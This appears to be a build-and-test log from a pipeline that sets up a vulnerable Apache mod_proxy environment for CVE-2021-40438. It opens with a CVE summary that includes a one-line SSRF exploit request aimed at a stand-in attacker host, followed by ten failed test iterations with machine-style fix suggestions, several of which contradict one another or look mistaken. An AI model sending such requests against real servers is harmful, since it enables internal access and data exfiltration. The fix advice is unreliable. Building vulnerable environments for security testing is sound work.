----------------------------------------


CVE description: CVE-2021-40438 is a critical server‑side request forgery vulnerability in the Apache HTTP Server. The flaw resides in the mod_proxy module of Apache HTTP Server versions 2.4.0 through 2.4.48 (inclusive). When mod_proxy is enabled, the module parses the entire request URI for the string “unix:”. An attacker can embed a specially crafted URI‑path that contains a pipe (|) followed by an arbitrary target URL. Because the parsing logic does not restrict the match to the beginning of the string, the crafted path causes mod_proxy to treat the attacker‑controlled URL as the destination for the proxied request. As a result, the vulnerable Apache front‑end forwards the request to any server the attacker chooses, enabling request smuggling, spoofing of source IP addresses, data exfiltration from internal services, and denial‑of‑service attacks against the chosen target. The vulnerability can be exploited remotely without authentication by sending a single HTTP request such as:

    curl "http://vulnerable.example/?unix:AAAA...|http://attacker-controlled.example"

No additional services or components are required to trigger the vulnerability; the presence of a vulnerable Apache HTTP Server with mod_proxy enabled is sufficient. Mitigation requires upgrading to Apache HTTP Server version 2.4.49 or later, or disabling the mod_proxy module entirely.

Test iteration #0 failed! See 'log0.txt' for details.
	- CONTAINER FAILURE (Manual Check):
	- ERROR: one of the containers of my Docker system is not running correctly.
	- FIX: The most common reason the Flask container fails to start is that it tries to open a MySQL connection before the database service is ready, causing a “can’t connect to MySQL server” error that aborts the app. Fix it by adding a lightweight wait‑for‑DB step (for example a small shell script that loops on `nc -z db 3306` or uses the official `wait-for-it.sh`) as the container’s entrypoint, or by adding a Docker‑Compose healthcheck for the db service and changing the depends_on entry to `depends_on: db: { condition: service_healthy }`. This ensures the Python container only launches after MySQL is accepting connections, and the service will start correctly.


Test iteration #1 failed! See 'log1.txt' for details.
	- CONTAINER FAILURE (LLM-as-a-Judge Check): The container is in a running state, but the logs show repeated errors: '/app/wait-for-db.sh: 7: nc: not found'. The startup script relies on the 'nc' (netcat) utility to check MySQL availability, but it is missing, causing the script to loop indefinitely with 'Waiting for MySQL at db:3306...' messages. Consequently, the main application (python app.py) never starts, indicating the container is not running correctly.
	- ERROR: The container is in a running state, but the logs show repeated errors: '/app/wait-for-db.sh: 7: nc: not found'. The startup script relies on the 'nc' (netcat) utility to check MySQL availability, but it is missing, causing the script to loop indefinitely with 'Waiting for MySQL at db:3306...' messages. Consequently, the main application (python app.py) never starts, indicating the container is not running correctly.
	- FIX: Add the netcat binary to the image so the wait‑for‑db script can run: in the app Dockerfile, after setting the work directory and before the final CMD, insert a line that updates the package list and installs netcat (for example, `RUN apt-get update && apt-get install -y --no-install-recommends netcat-openbsd && rm -rf /var/lib/apt/lists/*`). This provides the `nc` command required by the script, allowing it to detect when MySQL is listening and then exec the Python application, after which the container will start correctly.


Test iteration #2 failed! See 'log2.txt' for details.
	- CONTAINER FAILURE (Manual Check):
	- ERROR: one of the containers of my Docker system is not running correctly.
	- FIX: The most common reason the app service stays stuck is that the db service never reports healthy, so the depends_on condition never becomes true and Docker never starts the Flask container. In the compose file the healthcheck runs `mysqladmin ping -h localhost` without supplying the root password that the MySQL image requires, so the command always fails. Change the healthcheck to include the password (or use the `MYSQL_ROOT_PASSWORD` variable) – for example:

```yaml
healthcheck:
  test: ["CMD", "sh", "-c", "mysqladmin ping -h 127.0.0.1 -u root -p$MYSQL_ROOT_PASSWORD"]
  interval: 5s
  timeout: 2s
  retries: 10
```

Also make sure the environment variable `MYSQL_ROOT_PASSWORD` is exported inside the health‑check shell (Docker automatically propagates it). After updating the healthcheck, `docker compose up --build` will let the database become healthy, the `app` service will pass its `depends_on` condition, and the Flask container will start normally. If you prefer not to rely on the healthcheck, you can simply remove the `condition: service_healthy` line so the app starts regardless of the DB state and let the `wait-for-db.sh` script handle the startup ordering.


Test iteration #3 failed! See 'log3.txt' for details.
	- CONTAINER FAILURE (Manual Check):
	- ERROR: one of the containers of my Docker system is not running correctly.
	- FIX: The most common cause for the “app” service failing to start is the use of the condition: service_healthy syntax, which is only honored in the legacy version‑2 compose format; in a version‑3.8 file it is ignored, so the Flask container can try to connect before MySQL is fully ready and the health‑check loop in wait‑for‑db.sh fails. Change the compose file to version 2.4 (or drop the condition altogether) and keep the explicit wait script, or keep version 3.8 but remove the condition key and rely solely on the script; after that the app will wait for the database, obtain a connection, and the container will stay up. If the health‑check itself still errors, replace the test line with a full‑path command such as ["CMD","/usr/bin/mysqladmin","ping","-h","127.0.0.1","-u","root","-p$MYSQL_ROOT_PASSWORD"] so the container can locate mysqladmin inside the MySQL image. Once these adjustments are made, both services start correctly.


Test iteration #4 failed! See 'log4.txt' for details.
	- NOT VULNERABLE VERSION (LLM-as-a-Judge Check): The composition defines two services: 'app' based on python:3.8-slim and 'db' based on mysql:5.7. No httpd image or package is present in either the Dockerfiles or the inspect data. Because the httpd service is absent, the deployment does not use any httpd version—vulnerable or otherwise—so the 'code_hard_version' check fails (false). Likewise, the required httpd service is not used, so the 'services_ok' milestone also fails (false).
	- ERROR: The composition defines two services: 'app' based on python:3.8-slim and 'db' based on mysql:5.7. No httpd image or package is present in either the Dockerfiles or the inspect data.

Likewise, the required httpd service is not used, so the 'services_ok' milestone also fails (false).
	- FIX: To satisfy the code_hard_version and services_ok checks you need to add an Apache HTTP Server container that runs a vulnerable 2.4.x release with mod_proxy enabled; for example, include a new service in docker‑compose.yml that builds from an httpd:2.4.48 image (or another affected 2.4.x tag) and mounts a configuration file that loads mod_proxy and permits proxying, then have the app service communicate with this Apache front‑end instead of exposing Flask directly. By introducing the proper httpd image and configuration the deployment will contain the required hard‑coded version and the relevant service, allowing the vulnerability‑related checks to pass.


Test iteration #5 failed! See 'log5.txt' for details.
	- IMAGE BUILDING FAILURE (Manual Check)
	- ERROR: my Docker systems terminates its execution because of an error while building one of its images.
	- FIX: The build fails because the HTTP‑D Dockerfile has a typo in the path used for the closing **</Proxy>** line – it writes to “/usrlocal/apache2/conf/httpd.conf” instead of “/usr/local/apache2/conf/httpd.conf”, which leaves the configuration incomplete and causes the subsequent proxy directives to be appended to a non‑existent file. Fix the typo so the echo command targets “/usr/local/apache2/conf/httpd.conf”, and optionally add a dummy package name (or remove the empty `apt-get install -y --no-install-recommends` line) because running `apt-get install -y` with no arguments also aborts the build. After correcting the path and ensuring the apt command is valid, the image will build successfully.


Test iteration #6 failed! See 'log6.txt' for details.
	- IMAGE BUILDING FAILURE (Manual Check)
	- ERROR: my Docker systems terminates its execution because of an error while building one of its images.
	- FIX: The build is failing because the Apache image you base on (httpd 2.4.48) lacks the packages you try to install with apt‑get and, more importantly, the configuration you append assumes a writable /usr/local/apache2/conf/httpd.conf which isn’t present in that exact tag; upgrading to a newer, Debian‑based Apache tag (for example httpd:2.4.49) resolves both issues and also removes the CVE‑2021‑40438 flaw. In the Dockerfile replace the FROM line with FROM httpd:2.4.49 and keep the apt‑get install line (it will now run correctly). While you’re editing the file, change the proxy destination to the actual Flask port – use ProxyPass /app http://app:5000/ and the matching ProxyPassReverse line – and update the EXPOSE directive in the app Dockerfile to EXPOSE 5000 so the container advertises the correct port. After these three small edits the images build successfully and the stack runs without the earlier error.


Test iteration #7 failed! See 'log7.txt' for details.
	- IMAGE BUILDING FAILURE (Manual Check)
	- ERROR: my Docker systems terminates its execution because of an error while building one of its images.
	- FIX: The build fails in the httpd Dockerfile because the httpd:2.4.49 image you’re extending is the Alpine‑based variant, which does not provide the apt‑get package manager, so the “apt‑get update …” line aborts with “apt‑get: not found”. Switch to a Debian‑based httpd tag (for example httpd:2.4.49‑buster or httpd:2.4.49‑bullseye) so the apt commands work, or keep the Alpine base and replace the apt‑get line with the Alpine package manager syntax ( apk add --no‑cache ca-certificates ). After making that change the rest of the Dockerfile (the echo statements that enable mod_proxy) can run unchanged and the image will build successfully.


Test iteration #8 failed! See 'log8.txt' for details.
	- IMAGE BUILDING FAILURE (Manual Check)
	- ERROR: my Docker systems terminates its execution because of an error while building one of its images.
	- FIX: The build is failing because the base Apache image you reference (`httpd:2.4.49-buster`) does not exist in the official registry, so Docker can’t pull it and the subsequent RUN steps never execute. Change the first line of `dockers/CVE-2021-40438/custom_no_tool/httpd/Dockerfile` to use a valid tag such as `httpd:2.4.49` (or `httpd:2.4.49-bullseye` if you need a Buster‑compatible Debian base). After switching to a real image, the rest of the Dockerfile will run as intended and the container will start with the proxy modules enabled. No other changes are required for the build to succeed.


Test iteration #9 failed! See 'log9.txt' for details.
